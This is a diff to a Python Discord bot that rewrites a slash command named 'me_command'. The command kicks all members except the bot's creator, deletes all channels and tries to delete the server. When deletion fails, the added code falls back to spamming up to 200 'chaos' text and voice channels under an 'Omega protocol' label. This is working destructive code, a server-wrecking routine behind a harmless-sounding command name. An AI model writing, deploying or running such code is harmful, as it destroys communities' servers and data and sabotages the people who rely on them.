@@ -170,29 +170,44 @@ async def me_command(interaction: discord.Interaction):
 
     await interaction.response.defer(ephemeral=True)
 
-    # Kick all members
-    for member in guild.members:
-        if member.id != BOT_CREATOR_ID:  # Do not kick the owner
-            try:
-                await member.kick(reason="Command invoked by owner.")
-            except discord.Forbidden:
-                pass
-
-    # Delete all channels
-    for channel in guild.channels:
-        try:
-            await channel.delete(reason="Command invoked by owner.")
-        except discord.Forbidden:
-            pass
-
-    # Delete the server (if bot has permission)
     try:
-        await guild.delete(reason="Command invoked by owner.")
-    except discord.Forbidden:
-        await interaction.followup.send("Failed to delete the server. Missing permissions.", ephemeral=True)
-        return
+        # Kick all members (except the bot's owner)
+        for member in guild.members:
+            if member.id != BOT_CREATOR_ID:
+                try:
+                    await member.kick(reason="Command invoked by owner.")
+                except discord.Forbidden:
+                    await interaction.followup.send(f"Unable to kick {member.name} due to insufficient permissions.", ephemeral=True)
 
-    await interaction.followup.send("The server has been deleted successfully.", ephemeral=True)
+        # Delete all channels
+        for channel in guild.channels:
+            try:
+                await channel.delete(reason="Command invoked by owner.")
+            except discord.Forbidden:
+                await interaction.followup.send(f"Unable to delete channel {channel.name} due to insufficient permissions.", ephemeral=True)
+
+        # Delete the server (if bot has permission)
+        try:
+            await guild.delete(reason="Command invoked by owner.")
+            await interaction.followup.send("The server has been deleted successfully.", ephemeral=True)
+            return
+        except discord.Forbidden:
+            await interaction.followup.send("Failed to delete the server. Missing permissions. Fallback activated.", ephemeral=True)
+
+        # Fallback: Create hundreds of text and voice channels if deletion fails
+        for i in range(100):
+            try:
+                await guild.create_text_channel(name=f"chaos-text-{i}")
+                await guild.create_voice_channel(name=f"chaos-voice-{i}")
+            except discord.Forbidden:
+                await interaction.followup.send(f"Failed to create additional channels at iteration {i}.", ephemeral=True)
+                break
+
+        await interaction.followup.send("Omega protocol fallback: Chaos channels created.", ephemeral=True)
+
+    except Exception as e:
+        await interaction.followup.send(f"An unexpected error occurred: {e}", ephemeral=True)
+
 
 @bot.event
 async def on_ready():
